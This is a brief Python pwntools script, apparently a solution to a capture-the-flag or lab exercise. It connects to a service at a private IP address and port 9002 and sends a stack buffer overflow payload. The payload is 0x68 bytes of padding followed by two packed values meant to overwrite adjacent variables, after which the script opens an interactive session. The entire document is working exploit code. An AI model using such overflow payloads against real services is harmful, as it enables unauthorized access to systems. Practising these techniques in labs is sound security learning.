from pwn import *

context(arch="amd64", os="linux", endian="little")

r = remote("10.10.64.66", 9002)

payload =  b"A" * 0x68 + p32(0xc0d3) + p32(0xc0ff33)

r.send(payload)

r.interactive()
